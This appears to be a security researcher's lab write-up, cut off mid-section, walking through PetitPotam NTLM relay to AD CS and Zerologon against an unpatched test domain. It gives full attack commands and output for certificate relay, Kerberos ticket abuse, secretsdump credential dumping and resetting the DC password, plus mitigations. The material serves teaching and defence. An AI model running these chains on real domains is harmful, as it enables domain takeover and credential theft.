@@ -1,0 +1,312 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="description" content="A hands-on Active Directory lab covering PetitPotam-assisted NTLM relay to AD CS and Zerologon, with the commands, outputs, gotchas and recovery steps I used."><meta name="author" content="h00die-gr3y"><meta name="robots" content="index,follow"><meta name="theme-color" content="#090c0b"><meta name="color-scheme" content="dark"><link rel="canonical" href="https://h00die-gr3y.github.io/knowledge-base/active-directory-attack-techniques/"><link rel="icon" type="image/png" href="/images/site/favicon.png"><link rel="apple-touch-icon" href="/images/site/apple-touch-icon.png"><link rel="alternate" type="application/rss+xml" title="h00die-gr3y Research Feed" href="/rss.xml"><link rel="sitemap" href="/sitemap.xml"><link rel="me" href="https://github.com/h00die-gr3y"><meta property="og:site_name" content="h00die-gr3y"><meta property="og:title" content="Active Directory Domain Attacks: PetitPotam / AD CS and Zerologon — Knowledge Base — h00die-gr3y"><meta property="og:description" content="A hands-on Active Directory lab covering PetitPotam-assisted NTLM relay to AD CS and Zerologon, with the commands, outputs, gotchas and recovery steps I used."><meta property="og:url" content="https://h00die-gr3y.github.io/knowledge-base/active-directory-attack-techniques/"><meta property="og:type" content="article"><meta property="og:image" content="https://h00die-gr3y.github.io/images/site/h00die-gr3y-social.png"><meta property="og:image:alt" content="h00die-gr3y security research"><meta property="og:image:width" content="1254"><meta property="og:image:height" content="1254"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="Active Directory Domain Attacks: PetitPotam / AD CS and Zerologon — Knowledge Base — h00die-gr3y"><meta name="twitter:description" content="A hands-on Active Directory lab covering PetitPotam-assisted NTLM relay to AD CS and Zerologon, with the commands, outputs, gotchas and recovery steps I used."><meta name="twitter:image" content="https://h00die-gr3y.github.io/images/site/h00die-gr3y-social.png"><meta property="article:tag" content="Active Directory"><meta property="article:tag" content="AD CS"><meta property="article:tag" content="NTLM Relay"><meta property="article:tag" content="Kerberos"><meta property="article:tag" content="PetitPotam"><meta property="article:tag" content="Zerologon"><script type="application/ld+json">{"@context":"https://schema.org","@type":"TechArticle","headline":"Active Directory Domain Attacks: PetitPotam / AD CS and Zerologon","description":"A hands-on Active Directory lab covering PetitPotam-assisted NTLM relay to AD CS and Zerologon, with the commands, outputs, gotchas and recovery steps I used.","url":"https://h00die-gr3y.github.io/knowledge-base/active-directory-attack-techniques/","mainEntityOfPage":"https://h00die-gr3y.github.io/knowledge-base/active-directory-attack-techniques/","image":"https://h00die-gr3y.github.io/images/site/h00die-gr3y-social.png","author":{"@type":"Person","name":"h00die-gr3y","url":"https://h00die-gr3y.github.io/about/","sameAs":["https://github.com/h00die-gr3y"],"knowsAbout":["Vulnerability research","Exploit development","Application security","Network appliances","IoT and embedded security"]},"publisher":{"@type":"Person","name":"h00die-gr3y","url":"https://h00die-gr3y.github.io/about/","sameAs":["https://github.com/h00die-gr3y"],"knowsAbout":["Vulnerability research","Exploit development","Application security","Network appliances","IoT and embedded security"]},"keywords":"Active Directory, AD CS, NTLM Relay, Kerberos, PetitPotam, Zerologon"}</script><title>Active Directory Domain Attacks: PetitPotam / AD CS and Zerologon — Knowledge Base — h00die-gr3y</title><link rel="stylesheet" href="/_astro/Footer.B4NsPX6g.css"></head><body><a class="skip-link" href="#main-content">Skip to content</a><header class="site-header"><div class="container header-inner"><a class="brand" href="/" aria-label="h00die-gr3y home"><span class="brand-mark">H00DIE</span><span class="brand-dash">-</span><span class="brand-muted">GR3Y</span></a><nav class="main-nav" aria-label="Main navigation"><a href="/research/">Research</a><a href="/cves/">CVEs</a><a href="/exploits/">Exploits</a><a href="/articles/">Articles</a><a href="/knowledge-base/" aria-current="page">Knowledge Base</a><a href="/about/">About</a></nav><a class="github-link" href="https://github.com/h00die-gr3y" target="_blank" rel="noopener noreferrer">GitHub ↗<span class="sr-only"> (opens in a new tab)</span></a><details class="mobile-nav"><summary>Menu</summary><nav aria-label="Mobile navigation"><a href="/research/">Research</a><a href="/cves/">CVEs</a><a href="/exploits/">Exploits</a><a href="/articles/">Articles</a><a href="/knowledge-base/" aria-current="page">Knowledge Base</a><a href="/about/">About</a><a href="https://github.com/h00die-gr3y" target="_blank" rel="noopener noreferrer">GitHub ↗<span class="sr-only"> (opens in a new tab)</span></a></nav></details></div></header><main id="main-content" tabindex="-1"><section class="kb-detail-hero"><div class="container"><div class="kb-detail-labels"><span class="section-index">KNOWLEDGE BASE</span><span class="kb-topic-label">INFRASTRUCTURE</span></div><h1>Active Directory Domain Attacks: PetitPotam / AD CS and Zerologon</h1><p>A hands-on Active Directory lab covering PetitPotam-assisted NTLM relay to AD CS and Zerologon, with the commands, outputs, gotchas and recovery steps I used.</p></div></section><section class="kb-detail section-bordered"><div class="container kb-detail-grid"><article class="research-body kb-body"><h2 id="introduction">Introduction</h2>
+<p>Getting Domain Admin is still one of those moments that makes an Active Directory lab interesting.</p>
+<p>For this setup I wanted to play with two very different routes to a full domain takeover:</p>
+<ul>
+<li><strong>PetitPotam + NTLM relay to AD CS</strong></li>
+<li><strong>Zerologon</strong></li>
+</ul>
+<p>The lab is intentionally old and unpatched. That is the point: I want to see the complete attack chain and understand what each step gives me.</p>
+<p>My setup:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>Domain             : victim.com</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>Domain Controller</span></span>
+<span class="line"><span>Hostname           : advictim2012r2</span></span>
+<span class="line"><span>FQDN               : advictim2012r2.victim.com</span></span>
+<span class="line"><span>IP                 : 192.168.201.9</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>AD CS Server</span></span>
+<span class="line"><span>Hostname           : cavictim2012r2</span></span>
+<span class="line"><span>FQDN               : cavictim2012r2.victim.com</span></span>
+<span class="line"><span>IP                 : 192.168.100.10</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>Operating System   : Windows Server 2012 R2 evaluation</span></span>
+<span class="line"><span>Attacker system    : Kali Linux</span></span></code></pre>
+<p>These commands were captured in this lab with the tool versions shown in the output. Current releases may use slightly different paths or switches, so check the tool help when reproducing it.</p>
+<p><img src="/images/knowledge-base/active-directory-attack-techniques/petitpotam.png" alt="PetitPotam and AD CS lab"></p>
+<h2 id="part-1--petitpotam--ad-cs">Part 1 — PetitPotam + AD CS</h2>
+<h3 id="what-are-we-trying-to-do">What are we trying to do?</h3>
+<p>The chain is easier to understand when you write it down:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>force the Domain Controller to authenticate</span></span>
+<span class="line"><span>        ↓</span></span>
+<span class="line"><span>relay that NTLM authentication to AD CS web enrollment</span></span>
+<span class="line"><span>        ↓</span></span>
+<span class="line"><span>request a certificate as the DC machine account</span></span>
+<span class="line"><span>        ↓</span></span>
+<span class="line"><span>use that certificate for Kerberos authentication</span></span>
+<span class="line"><span>        ↓</span></span>
+<span class="line"><span>recover the DC machine-account NT hash</span></span>
+<span class="line"><span>        ↓</span></span>
+<span class="line"><span>request privileged tickets</span></span>
+<span class="line"><span>        ↓</span></span>
+<span class="line"><span>dump domain secrets</span></span></code></pre>
+<p>PetitPotam is the first push. The real power comes from successfully relaying the machine authentication to the Certificate Authority.</p>
+<h3 id="tools">Tools</h3>
+<p>For this lab I used:</p>
+<ul>
+<li>Python virtual environment;</li>
+<li>Impacket / <code>ntlmrelayx</code>;</li>
+<li>PetitPotam;</li>
+<li>PKINITtools.</li>
+</ul>
+<p>I kept the Python tools in a virtual environment:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#B392F0">apt</span><span style="color:#9ECBFF"> install</span><span style="color:#9ECBFF"> python3-venv</span></span>
+<span class="line"><span style="color:#B392F0">mkdir</span><span style="color:#9ECBFF"> pyvirtenv</span></span>
+<span class="line"><span style="color:#B392F0">python3</span><span style="color:#79B8FF"> -m</span><span style="color:#9ECBFF"> venv</span><span style="color:#9ECBFF"> pyvirtenv</span></span>
+<span class="line"><span style="color:#79B8FF">source</span><span style="color:#9ECBFF"> pyvirtenv/bin/activate</span></span></code></pre>
+<p>For the Impacket branch I was using at the time:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#79B8FF">cd</span><span style="color:#9ECBFF"> pyvirtenv</span></span>
+<span class="line"><span style="color:#B392F0">git</span><span style="color:#9ECBFF"> clone</span><span style="color:#9ECBFF"> https://github.com/ExAndroidDev/impacket.git</span></span>
+<span class="line"><span style="color:#79B8FF">cd</span><span style="color:#9ECBFF"> impacket</span></span>
+<span class="line"><span style="color:#B392F0">git</span><span style="color:#9ECBFF"> checkout</span><span style="color:#9ECBFF"> ntlmrelayx-adcs-attack</span></span>
+<span class="line"><span style="color:#B392F0">python3</span><span style="color:#9ECBFF"> setup.py</span><span style="color:#9ECBFF"> install</span></span></code></pre>
+<p>PetitPotam:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#79B8FF">cd</span><span style="color:#9ECBFF"> ~/pyvirtenv</span></span>
+<span class="line"><span style="color:#B392F0">git</span><span style="color:#9ECBFF"> clone</span><span style="color:#9ECBFF"> https://github.com/topotam/PetitPotam</span></span>
+<span class="line"><span style="color:#79B8FF">cd</span><span style="color:#9ECBFF"> PetitPotam</span></span>
+<span class="line"><span style="color:#B392F0">pip3</span><span style="color:#9ECBFF"> install</span><span style="color:#79B8FF"> -r</span><span style="color:#9ECBFF"> requirements.txt</span></span></code></pre>
+<p>PKINITtools:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#79B8FF">cd</span><span style="color:#9ECBFF"> ~/pyvirtenv</span></span>
+<span class="line"><span style="color:#B392F0">git</span><span style="color:#9ECBFF"> clone</span><span style="color:#9ECBFF"> https://github.com/dirkjanm/PKINITtools</span></span>
+<span class="line"><span style="color:#79B8FF">cd</span><span style="color:#9ECBFF"> PKINITtools</span></span>
+<span class="line"><span style="color:#B392F0">pip3</span><span style="color:#9ECBFF"> install</span><span style="color:#79B8FF"> -r</span><span style="color:#9ECBFF"> requirements.txt</span></span></code></pre>
+<h3 id="make-sure-dns-works-first">Make sure DNS works first</h3>
+<p>Kerberos and certificates care about names, so I made sure the Kali box could resolve the domain controller and CA.</p>
+<p>In this lab <code>/etc/resolv.conf</code> pointed to the DNS service on the DC:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>nameserver 192.168.201.9</span></span></code></pre>
+<p>Do this check before spending time debugging PKINIT.</p>
+<h3 id="start-the-ntlm-relay">Start the NTLM relay</h3>
+<p>I pointed <code>ntlmrelayx</code> at the AD CS web enrollment endpoint:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#B392F0">python3</span><span style="color:#9ECBFF"> impacket/examples/ntlmrelayx.py</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  -debug</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  -smb2support</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  --target</span><span style="color:#9ECBFF"> http://cavictim2012r2.victim.com/certsrv/certrqus.asp</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  --template</span><span style="color:#9ECBFF"> DomainController</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  --adcs</span></span></code></pre>
+<p>The important part of the output is that the relay services start and wait:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>[*] Running in relay mode to single host</span></span>
+<span class="line"><span>[*] Setting up SMB Server</span></span>
+<span class="line"><span>[*] Setting up HTTP Server</span></span>
+<span class="line"><span>[*] Setting up WCF Server</span></span>
+<span class="line"><span>[*] Servers started, waiting for connections</span></span></code></pre>
+<h3 id="coerce-the-domain-controller-with-petitpotam">Coerce the Domain Controller with PetitPotam</h3>
+<p>In a second terminal:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#B392F0">python3</span><span style="color:#9ECBFF"> PetitPotam/PetitPotam.py</span><span style="color:#79B8FF"> 192.168.201.20</span><span style="color:#79B8FF"> 192.168.201.9</span></span></code></pre>
+<p>And this is the bit I wanted to see:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>Trying pipe lsarpc</span></span>
+<span class="line"><span>[-] Connecting to ncacn_np:192.168.201.9[\PIPE\lsarpc]</span></span>
+<span class="line"><span>[+] Connected!</span></span>
+<span class="line"><span>[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e</span></span>
+<span class="line"><span>[+] Successfully bound!</span></span>
+<span class="line"><span>[-] Sending EfsRpcOpenFileRaw!</span></span>
+<span class="line"><span>[+] Got expected ERROR_BAD_NETPATH exception!!</span></span>
+<span class="line"><span>[+] Attack worked!</span></span></code></pre>
+<p>Back in <code>ntlmrelayx</code> the DC machine account authenticated to the relay and the request to AD CS succeeded:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>[*] Authenticating against http://cavictim2012r2.victim.com as VICTIM/ADVICTIM2012R2$ SUCCEED</span></span>
+<span class="line"><span>[*] HTTP server returned error code 200, treating as a successful login</span></span>
+<span class="line"><span>[*] Generating CSR...</span></span>
+<span class="line"><span>[*] CSR generated!</span></span>
+<span class="line"><span>[*] Getting certificate...</span></span>
+<span class="line"><span>[*] GOT CERTIFICATE!</span></span>
+<span class="line"><span>[*] Base64 certificate of user ADVICTIM2012R2$:</span></span>
+<span class="line"><span>...</span></span></code></pre>
+<p>We now have a certificate for the Domain Controller machine account.</p>
+<h3 id="decode-the-pfx">Decode the PFX</h3>
+<p>I saved the Base64 certificate as <code>crt.pfx.b64</code> and decoded it:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#B392F0">cat</span><span style="color:#9ECBFF"> crt.pfx.b64</span><span style="color:#F97583"> |</span><span style="color:#B392F0"> base64</span><span style="color:#79B8FF"> -d</span><span style="color:#F97583"> &gt;</span><span style="color:#9ECBFF"> crt.pfx</span></span></code></pre>
+<h3 id="request-a-kerberos-tgt-with-the-certificate">Request a Kerberos TGT with the certificate</h3>
+<p>Next I used <code>gettgtpkinit.py</code>:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#B392F0">python3</span><span style="color:#9ECBFF"> PKINITtools/gettgtpkinit.py</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  -cert-pfx</span><span style="color:#9ECBFF"> crt.pfx</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#9ECBFF">  victim.com/ADVICTIM2012R2</span><span style="color:#79B8FF">\$</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#9ECBFF">  out.ccache</span></span></code></pre>
+<p>My output contained:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>INFO:minikerberos:Loading certificate and key from file</span></span>
+<span class="line"><span>INFO:minikerberos:Requesting TGT</span></span>
+<span class="line"><span>INFO:minikerberos:AS-REP encryption key (you might need this later):</span></span>
+<span class="line"><span>fac3a7b493bd2d3a32c7fb959345c11e712ef96db0e46205150cdd57938490ef</span></span>
+<span class="line"><span>INFO:minikerberos:Saved TGT to file</span></span></code></pre>
+<p>Keep both:</p>
+<ul>
+<li><code>out.ccache</code></li>
+<li>the AS-REP encryption key</li>
+</ul>
+<p>We need them in the next step.</p>
+<h3 id="two-pkinit-errors-worth-remembering">Two PKINIT errors worth remembering</h3>
+<p>I hit these while building the lab.</p>
+<h4 id="kdc_err_client_not_trusted"><code>KDC_ERR_CLIENT_NOT_TRUSTED</code></h4>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>KDC_ERR_CLIENT_NOT_TRUSTED</span></span>
+<span class="line"><span>"The client trust failed or is not implemented"</span></span></code></pre>
+<p>In my case the root certificate was not properly propagated to the Domain Controller.</p>
+<h4 id="kdc_err_padata_type_nosupp"><code>KDC_ERR_PADATA_TYPE_NOSUPP</code></h4>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>KDC_ERR_PADATA_TYPE_NOSUPP</span></span>
+<span class="line"><span>"KDC has no support for PADATA type"</span></span></code></pre>
+<p>I ran into this while experimenting with Windows Server 2008 R2 and smart-card logon / PKINIT support.</p>
+<p>These errors appear <strong>after</strong> the relay stage, so do not immediately blame PetitPotam or <code>ntlmrelayx</code>.</p>
+<h3 id="recover-the-dc-machine-account-nt-hash">Recover the DC machine-account NT hash</h3>
+<p>Now use the ticket cache and AS-REP key:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#E1E4E8">KRB5CCNAME</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">out.ccache</span><span style="color:#B392F0"> \</span></span>
+<span class="line"><span style="color:#E1E4E8">python3 </span><span style="color:#9ECBFF">PKINITtools/getnthash.py</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#9ECBFF">  victim.com/ADVICTIM2012R2</span><span style="color:#79B8FF">\$</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  -key</span><span style="color:#9ECBFF"> fac3a7b493bd2d3a32c7fb959345c11e712ef96db0e46205150cdd57938490ef</span></span></code></pre>
+<p>Result:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>[*] Using TGT from cache</span></span>
+<span class="line"><span>[*] Requesting ticket to self with PAC</span></span>
+<span class="line"><span>Recovered NT Hash</span></span>
+<span class="line"><span>6584bf06e7b65c680426dd1b21352f01</span></span></code></pre>
+<p>At this point the attack has moved a long way from “I can coerce authentication.” We now hold authentication material for the DC machine account.</p>
+<h3 id="pick-an-administrative-account">Pick an administrative account</h3>
+<p>I used CrackMapExec to list interesting accounts:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#B392F0">crackmapexec</span><span style="color:#9ECBFF"> ldap</span><span style="color:#9ECBFF"> advictim2012r2.victim.com</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  -u</span><span style="color:#9ECBFF"> ADVICTIM2012R2</span><span style="color:#79B8FF">\$</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  -H</span><span style="color:#9ECBFF"> 6584bf06e7b65c680426dd1b21352f01</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  --admin-count</span></span></code></pre>
+<p>Among the output:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>LDAP  advictim2012r2.victim.com 389  ADVICTIM2012R2  Administrator</span></span>
+<span class="line"><span>LDAP  advictim2012r2.victim.com 389  ADVICTIM2012R2  krbtgt</span></span>
+<span class="line"><span>LDAP  advictim2012r2.victim.com 389  ADVICTIM2012R2  Domain Admins</span></span>
+<span class="line"><span>LDAP  advictim2012r2.victim.com 389  ADVICTIM2012R2  Enterprise Admins</span></span></code></pre>
+<p>For the next step I used <code>Administrator</code>.</p>
+<h3 id="request-the-service-ticket">Request the service ticket</h3>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#E1E4E8">KRB5CCNAME</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">out.ccache</span><span style="color:#B392F0"> \</span></span>
+<span class="line"><span style="color:#E1E4E8">python3 </span><span style="color:#9ECBFF">PKINITtools/gets4uticket.py</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#9ECBFF">  kerberos+ccache://victim.com</span><span style="color:#79B8FF">\\</span><span style="color:#9ECBFF">ADVICTIM2012R2</span><span style="color:#79B8FF">\$</span><span style="color:#9ECBFF">:out.ccache@ADVICTIM2012R2.victim.com</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#9ECBFF">  cifs/ADVICTIM2012R2.victim.com@victim.com</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#9ECBFF">  Administrator@victim.com</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#9ECBFF">  Administrator.ccache</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  -v</span></span></code></pre>
+<p>And:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>INFO:minikerberos:Trying to get SPN with Administrator@victim.com for cifs/ADVICTIM2012R2.victim.com@victim.com</span></span>
+<span class="line"><span>INFO:minikerberos:Success!</span></span>
+<span class="line"><span>INFO:minikerberos:Done!</span></span></code></pre>
+<h3 id="dump-the-directory-secrets">Dump the directory secrets</h3>
+<p>With the Administrator ticket cache:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#E1E4E8">KRB5CCNAME</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">Administrator.ccache</span><span style="color:#B392F0"> \</span></span>
+<span class="line"><span style="color:#E1E4E8">python3 </span><span style="color:#9ECBFF">impacket/examples/secretsdump.py</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  -just-dc-ntlm</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  -user-status</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  -debug</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  -k</span><span style="color:#9ECBFF"> victim.com/Administrator@ADVICTIM2012R2.victim.com</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  -no-pass</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  -outputfile</span><span style="color:#9ECBFF"> victim.com</span></span></code></pre>
+<p>A small part of the lab output:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span></span>
+<span class="line"><span>[*] Using the DRSUAPI method to get NTDS.DIT secrets</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>Administrator:500:...:41b3f9ac5278dae30d67b59e3b01383f::: (status=Enabled)</span></span>
+<span class="line"><span>krbtgt:502:...:4e10b53bcd24af9db5f2f9cb302d3a94::: (status=Disabled)</span></span>
+<span class="line"><span>ADVICTIM2012R2$:1000:...:6584bf06e7b65c680426dd1b21352f01::: (status=Enabled)</span></span></code></pre>
+<p>At that point the lab domain is effectively owned.</p>
+<h3 id="what-i-would-fix">What I would fix</h3>
+<p>The main controls I care about for this chain are:</p>
+<ul>
+<li>LDAP signing and channel binding where applicable;</li>
+<li>Extended Protection for Authentication (EPA) on AD CS web enrollment;</li>
+<li>EPA on Certificate Enrollment Web Service;</li>
+<li>reducing NTLM where the environment allows it;</li>
+<li>blocking relayable AD CS enrollment paths.</li>
+</ul>
+<p>Microsoft KB5005413 is a good reference for the AD CS relay side.</p>
+<hr>
+<h2 id="part-2--zerologon">Part 2 — Zerologon</h2>
+<p>PetitPotam / AD CS is a multi-step relay chain. Zerologon is a completely different beast.</p>
+<p>The vulnerability sits in Netlogon authentication. The vulnerable implementation used AES-CFB8 with a fixed all-zero IV. Combined with acceptance of insecure Netlogon sessions, repeated all-zero authentication attempts could eventually succeed.</p>
+<p>The rough flow is:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>authenticate as the DC machine account</span></span>
+<span class="line"><span>        ↓</span></span>
+<span class="line"><span>set the DC machine-account password to empty</span></span>
+<span class="line"><span>        ↓</span></span>
+<span class="line"><span>use that state to dump domain secrets</span></span>
+<span class="line"><span>        ↓</span></span>
+<span class="line"><span>recover the real machine-account secret</span></span>
+<span class="line"><span>        ↓</span></span>
+<span class="line"><span>restore it immediately</span></span></code></pre>
+<p>The last step is not housekeeping. It is part of the exploit procedure.</p>
+<h2 id="check-the-dc-with-metasploit">Check the DC with Metasploit</h2>
+<p>I used the Zerologon auxiliary module:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) &gt; options</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>   Name    Current Setting  Required  Description</span></span>
+<span class="line"><span>   ----    ---------------  --------  -----------</span></span>
+<span class="line"><span>   NBNAME  advictim2012r2   yes       The server's NetBIOS name</span></span>
+<span class="line"><span>   RHOSTS  192.168.201.9    yes       The target host</span></span></code></pre>
+<p>Then:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) &gt; check</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>[*] 192.168.201.9: - Connecting to the endpoint mapper service...</span></span>
+<span class="line"><span>[+] 192.168.201.9 - The target is vulnerable.</span></span></code></pre>
+<p>That is the safe moment to stop if the assessment does not authorize disruptive exploitation.</p>
+<h2 id="important-this-changes-domain-controller-state">Important: this changes Domain Controller state</h2>
+<p>The exploitation action sets the DC machine-account password to an empty value.</p>
+<p>That creates an inconsistency between:</p>
+<ul>
+<li>the password in Active Directory;</li>
+<li>the password stored locally by the Domain Controller.</li>
+</ul>
+<p>Replication and other domain functions can break.</p>
+<p>So before I run this part I make sure I am in a lab, I know how to recover the current machine password, and I am ready to restore it immediately.</p>
+<h2 id="set-the-machine-account-password-to-empty">Set the machine-account password to empty</h2>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) &gt; exploit</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>[*] Running module against 192.168.201.9</span></span>
+<span class="line"><span>[+] 192.168.201.9:49155 - Successfully authenticated</span></span>
+<span class="line"><span>[+] 192.168.201.9:49155 - Successfully set the machine account (advictim2012r2$) password to empty</span></span>
+<span class="line"><span>[*] Auxiliary module execution completed</span></span></code></pre>
+<h2 id="dump-the-domain-credentials">Dump the domain credentials</h2>
+<p>Now the DC account can be used without a password:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#B392F0">python3</span><span style="color:#9ECBFF"> /usr/share/doc/python3-impacket/examples/secretsdump.py</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#9ECBFF">  'ADVICTIM2012R2$'@192.168.201.9</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  -no-pass</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  -outputfile</span><span style="color:#9ECBFF"> victim.com</span><span style="color:#79B8FF"> \</span></span>
+<span class="line"><span style="color:#79B8FF">  -user-status</span></span></code></pre>
+<p>The lab output included:</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span></span>
+<span class="line"><span>Administrator:500:...:41b3f9ac5278dae30d67b59e3b01383f::: (status=Enabled)</span></span>
+<span class="line"><span>krbtgt:502:...:4e10b53bcd24af9db5f2f9cb302d3a94::: (status=Disabled)</span></span>
+<span class="line"><span>ADVICTIM2012R2$:1000:...:31d6cfe0d16ae931b73c59d7e0c089c0::: (status=Enabled)</span></span></code></pre>
+<h2 id="recover-the-real-machine-account-password">Recover the real machine-account password</h2>
+<p>Before restoring the account I need the current machine-account secret from the Domain Controller.</p>
+<p>Using an administrative hash from the lab:</p>
